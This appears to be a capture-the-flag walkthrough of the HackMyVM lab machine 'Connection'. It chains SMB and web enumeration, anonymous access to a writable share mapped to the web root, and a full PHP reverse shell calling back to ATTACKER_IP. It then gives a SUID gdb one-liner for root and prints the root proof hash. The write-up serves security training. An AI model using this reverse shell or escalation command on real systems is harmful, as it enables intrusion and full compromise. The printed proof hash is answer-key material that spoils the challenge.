# HackMyVM — Connection | Linux Machine Walkthrough

## Introduction

Today we are back with another HackMyVM machine after a long time.

This time we are solving a Linux-based machine named **Connection**.

Unlike some of the easier HackMyVM machines, the target IP address is not directly provided, so our first step is to identify the machine on the local network.

The complete attack path for this machine was:

**Netdiscover → Nmap → SMB Enumeration → Anonymous SMB Share → Writable Web Root → PHP Reverse Shell → www-data → SUID Enumeration → SUID GDB → Root**

---

## 1. Finding the Target IP

Since the machine does not provide its IP address on the boot screen, we can use `netdiscover` to identify hosts on the local network.

![Machine Image](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q1.png)

The command used was:

    netdiscover -i eth1

Replace `eth1` with the interface connected to the HackMyVM network.

The output showed:

    IP              At MAC Address       Count     Len  MAC Vendor / Hostname
    ----------------------------------------------------------------------------
    192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
    192.168.56.100  08:00:27:60:48:40      2     120  PCS Systemtechnik
    192.168.56.147  08:00:27:02:bb:1c      2     120  PCS Systemtechnik

The target machine was:

    Main IP :: 192.168.56.147

![Netdiscover Output](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q2.png)

---

# 2. Full Port Scan

Now that we have the target IP, we can start with a complete TCP port scan.

The command used was:

    nmap -p- --min-rate 5000 -T4 192.168.56.147

The scan returned:

    Nmap scan report for 192.168.56.147
    Host is up, received arp-response (0.00017s latency).

    Not shown: 65531 closed tcp ports (reset)

    PORT    STATE SERVICE      REASON
    22/tcp  open  ssh          syn-ack ttl 64
    80/tcp  open  http         syn-ack ttl 64
    139/tcp open  netbios-ssn  syn-ack ttl 64
    445/tcp open  microsoft-ds syn-ack ttl 64

    MAC Address: 08:00:27:02:BB:1C (Oracle VirtualBox virtual NIC)

We have four interesting open ports:

- `22/tcp` — SSH
- `80/tcp` — HTTP
- `139/tcp` — NetBIOS / SMB
- `445/tcp` — SMB

![All Port Scan](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q3.png)

The presence of SMB on ports `139` and `445` is particularly interesting, so we will investigate those services further.

---

# 3. Service and Version Detection

Next, we perform service and version detection against the discovered ports.

    nmap -sC -sV -p 22,80,139,445 192.168.56.147

The result:

    Nmap scan report for 192.168.56.147
    Host is up, received arp-response (0.00030s latency).

    PORT    STATE SERVICE     REASON         VERSION
    22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

    80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    | http-methods:
    |_  Supported Methods: GET POST OPTIONS HEAD
    |_http-server-header: Apache/2.4.38 (Debian)

    139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

    445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)

    MAC Address: 08:00:27:02:BB:1C (Oracle VirtualBox virtual NIC)

    Service Info: Host: CONNECTION; OS: Linux

The important services are now confirmed:

- OpenSSH 7.9p1
- Apache 2.4.38
- Samba 4.9.5

The SMB scripts also provide useful information.

For example:

    smb-security-mode:
        account_used: guest
        authentication_level: user
        challenge_response: supported
        message_signing: disabled

And:

    smb2-security-mode:
        3.1.1:
        Message signing enabled but not required

![Service and Version Detection](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q4.png)

At this point, SMB becomes our primary area of investigation.

---

# 4. SMB Enumeration with enum4linux

We start by using `enum4linux` to gather information from the SMB service.

    enum4linux -a 192.168.56.147

Among the results, we discover several built-in groups:

    S-1-5-32-544 BUILTIN\Administrators (Local Group)
    S-1-5-32-545 BUILTIN\Users (Local Group)
    S-1-5-32-546 BUILTIN\Guests (Local Group)
    S-1-5-32-547 BUILTIN\Power Users (Local Group)
    S-1-5-32-548 BUILTIN\Account Operators (Local Group)
    S-1-5-32-549 BUILTIN\Server Operators (Local Group)
    S-1-5-32-550 BUILTIN\Print Operators (Local Group)

![Enum4linux Enumeration](URL 5)

Nothing immediately gives us credentials, so we continue with SMB share enumeration.

---

# 5. Enumerating SMB Shares

We can use `smbclient` to list the shares available on the target.

    smbclient -L 192.168.56.147 -N

The `-N` option allows us to attempt an anonymous connection without providing a password.

The result:

    Anonymous login successful

            Sharename       Type      Comment
            ---------       ----      -------
            share           Disk
            print$          Disk      Printer Drivers
            IPC$            IPC       IPC Service (Private Share for uploading files)

    Reconnecting with SMB1 for workgroup listing.
    Anonymous login successful

            Server               Comment
            ---------            -------
            
            Workgroup            Master
            ---------            -------
            WORKGROUP            CONNECTION

The most interesting share is:

    share

Anonymous access is allowed.

![SMB Share Enumeration](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q5.png)

---

# 6. Accessing the Anonymous Share

Let's connect directly to the `share` SMB share.

    smbclient //192.168.56.147/share -N

The connection succeeds:

    Anonymous login successful
    Try "help" to get a list of possible commands.

Now we list the contents:

    smb: \> ls

The output:

    .                                   D        0  Wed Sep 23 14:33:39 2020
    ..                                  D        0  Wed Sep 23 14:33:39 2020
    html                                D        0  Wed Sep 23 15:05:00 2020

    7158264 blocks of size 1024. 5460212 blocks available

The important directory here is:

    html

![SMB Share Contents](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q6.png)

This is where things become interesting.

---

# 7. Connecting SMB to the Web Server

We already discovered that Apache is running on port `80`.

The SMB share contains a directory named:

    html

The web server is also serving content from its Apache document root.

This immediately raises an important possibility:

**Could the SMB `html` directory correspond to the web server's document root?**

If that is the case, a writable SMB share could potentially allow us to place a server-side script into the web directory and execute it through HTTP.

Before moving forward, we also perform web content enumeration.

---

# 8. Web Enumeration

We tried directory enumeration against the HTTP service.

For example:

    gobuster dir -u http://192.168.56.147 -w /usr/share/seclists/Discovery/Web-Content/common.txt

The web server itself initially shows the default Apache page.

![Gobuster Enumeration](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q7.png)

The web fuzzing did not provide anything particularly useful.

However, the SMB share gave us something much more interesting:

    share/html

Since the `html` directory appears to be associated with the web server, we can test whether we can write files into it.

---

# 9. Uploading a PHP Reverse Shell

We create a PHP reverse shell on our attacker machine.

Example PHP reverse shell:

    <?php
    $ip = "ATTACKER_IP";
    $port = 4444;

    $sock = fsockopen($ip, $port);
    $proc = proc_open(
        "/bin/sh",
        array(
            0 => $sock,
            1 => $sock,
            2 => $sock
        ),
        $pipes
    );
    ?>

We then connect to the SMB share:

    smbclient //192.168.56.147/share -N

And move into the web directory:

    smb: \> cd html

We upload the PHP shell:

    smb: \html\> put shell.php

Now we start a listener on our attacking machine:

    nc -lvnp 4444

After that, we access the uploaded PHP file through the web server:

    http://192.168.56.147/shell.php

The PHP file executes on the target and connects back to our listener.

We successfully obtain a reverse shell as:

    www-data

![PHP Reverse Shell](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q8.png)

This gives us our initial foothold on the machine.

---

# 10. Stabilizing the Reverse Shell

The initial reverse shell is limited, so we upgrade it to a more usable interactive shell.

First, we check whether Python is available:

    which python

The target returns:

    /usr/bin/python

We can then spawn a PTY using Python:

    python3 -c 'import pty; pty.spawn("/bin/bash")'

On the attacker machine, we suspend the listener:

    CTRL+Z

Then run:

    stty raw -echo

And bring the listener back:

    fg

Finally:

    export TERM=xterm

We now have a much more usable shell.

---

# 11. Finding the Local Flag

Now we start exploring the filesystem.

    cd /home/connection
    ls

The directory contains:

    local.txt

We read it with:

    cat local.txt

This gives us the local flag.

![Local Flag](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q9.png)

With initial access complete, we move on to privilege escalation.

---

# 12. Privilege Escalation Enumeration

For local enumeration, we transfer `linpeas.sh` to the target.

The target does not have some common transfer utilities such as:

    wget
    curl
    nc

Since SMB access is already available, we can use the SMB share to transfer our enumeration tools and place them into `/tmp`.

We then execute `linpeas.sh` and also perform manual SUID enumeration.

---

# 13. SUID Enumeration

We search the filesystem for SUID binaries:

    find / -type f -perm -4000 2>/dev/null

The output includes:

    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/bin/newgrp
    /usr/bin/umount
    /usr/bin/su
    /usr/bin/passwd
    /usr/bin/gdb
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/bin/mount
    /usr/bin/gpasswd

Most of these are normal SUID system binaries.

However, one entry immediately stands out:

    /usr/bin/gdb

A SUID-enabled `gdb` binary is highly interesting because GDB provides Python execution functionality and can execute commands with the privileges inherited from the SUID binary.

![SUID GDB](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q11.png)

This gives us a potential direct path to root.

---

# 14. Exploiting SUID GDB

We can check GTFOBins for a known technique involving SUID `gdb`.

The command we use is:

    gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

The important part is:

    python import os; os.execl("/bin/sh", "sh", "-p")

This uses GDB's embedded Python interpreter to execute:

    os.execl("/bin/sh", "sh", "-p")

The `-p` option tells the shell to preserve the privileged effective user ID.

We execute the command:

    /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

A privileged shell is spawned.

We can verify our privileges:

    id

The result shows:

    uid=0(root)

At this point, we have successfully escalated from:

    www-data

to:

    root

---

# 15. Finding the Root Proof

Initially, we try:

    cat /root/root.txt

But the machine responds:

    cat: /root/root.txt: No such file or directory

So we inspect the `/root` directory:

    cd /root
    ls

The directory contains:

    proof.txt

We read it:

    cat proof.txt

The final proof is:

    a7c6ea4931ab86fb54c5400204474a39

![Root Proof](https://github.com/naval0505/HackMyVM/blob/84c80194778b18101221df876c5a69a2af2ca56b/Connection%20-%20HackMyVM%20Writeup/Images/q12.png)

The machine has now been fully compromised.

---

# 16. Complete Attack Chain

    Target Machine
          |
          v
    Netdiscover
          |
          v
    192.168.56.147
          |
          v
    Nmap Enumeration
          |
          +---------------------------+
          |                           |
          v                           v
        HTTP                         SMB
         80                         139/445
          |                           |
          |                           v
          |                    Anonymous Access
          |                           |
          |                           v
          |                     share/html
          |                           |
          +-------------+-------------+
                        |
                        v
                 Writable Web Root
                        |
                        v
              Upload PHP Reverse Shell
                        |
                        v
                    www-data
                        |
                        v
                 Shell Stabilization
                        |
                        v
                    local.txt
                        |
                        v
               Privilege Escalation
                        |
                        v
                  SUID Enumeration
                        |
                        v
                    SUID GDB
                        |
                        v
                GDB Python Execution
                        |
                        v
                    Root Shell
                        |
                        v
                  /root/proof.txt

---

# 17. Important Findings

## Anonymous SMB Access

The target allowed anonymous SMB authentication:

    smbclient -L 192.168.56.147 -N

This exposed:

    share
    print$
    IPC$

The `share` directory was accessible without credentials.

## SMB-to-Web Relationship

Inside the SMB share we found:

    html

This directory corresponded to content served by Apache.

Because the share was writable, we could upload a PHP file directly into the web root.

## Reverse Shell

The uploaded PHP reverse shell gave us:

    www-data

This was the initial foothold.

## SUID GDB

Manual SUID enumeration revealed:

    /usr/bin/gdb

Because GDB was SUID-enabled, it could be abused to execute a shell with elevated privileges.

## Root

The final escalation was:

    SUID GDB
        ↓
    GDB Python execution
        ↓
    /bin/sh -p
        ↓
    root

---

# 18. Commands Used

## Network Discovery

    netdiscover -i eth1

## Full Port Scan

    nmap -p- --min-rate 5000 -T4 192.168.56.147

## Service Detection

    nmap -sC -sV -p 22,80,139,445 192.168.56.147

## SMB Enumeration

    enum4linux -a 192.168.56.147

## SMB Share Enumeration

    smbclient -L 192.168.56.147 -N

## Connect to Share

    smbclient //192.168.56.147/share -N

## Web Enumeration

    gobuster dir -u http://192.168.56.147 -w /usr/share/seclists/Discovery/Web-Content/common.txt

## Shell Stabilization

    python3 -c 'import pty; pty.spawn("/bin/bash")'

    stty raw -echo
    fg
    export TERM=xterm

## SUID Enumeration

    find / -type f -perm -4000 2>/dev/null

## GDB Privilege Escalation

    /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

## Verify Root

    id

## Read Root Proof

    cd /root
    ls
    cat proof.txt

---

# 19. Final Results

| Objective | Status |
|---|---|
| Target IP Discovery | Completed |
| Full Port Scan | Completed |
| Service Enumeration | Completed |
| SMB Enumeration | Completed |
| Anonymous SMB Access | Completed |
| `share` Discovery | Completed |
| `html` Directory Discovery | Completed |
| Web Root Write Access | Completed |
| PHP Reverse Shell | Completed |
| `www-data` Shell | Completed |
| Local Flag | Completed |
| SUID Enumeration | Completed |
| SUID GDB Discovery | Completed |
| Privilege Escalation | Completed |
| Root Access | Completed |
| Root Proof | Completed |

---

# 20. Final Summary

The **Connection** HackMyVM machine was a good example of how seemingly separate services can be chained together to obtain full system compromise.

The initial enumeration revealed SSH, HTTP, and SMB.

The most important discovery was anonymous access to the SMB `share`. Inside the share, we found an `html` directory that was connected to the Apache web root.

Because we could write to this directory, we uploaded a PHP reverse shell and triggered it through the web server.

This provided an initial shell as `www-data`.

After obtaining the foothold, we performed local privilege escalation enumeration and discovered that `/usr/bin/gdb` had the SUID bit set.

A SUID-enabled GDB allowed us to execute Python code with elevated privileges and spawn a privileged shell.

The final attack chain was:

    Anonymous SMB
          ↓
    Writable html directory
          ↓
    PHP reverse shell
          ↓
        www-data
          ↓
      SUID enumeration
          ↓
       SUID GDB
          ↓
    GDB Python execution
          ↓
         root
          ↓
    /root/proof.txt

The final root proof was:

    a7c6ea4931ab86fb54c5400204474a39

# Pwned!
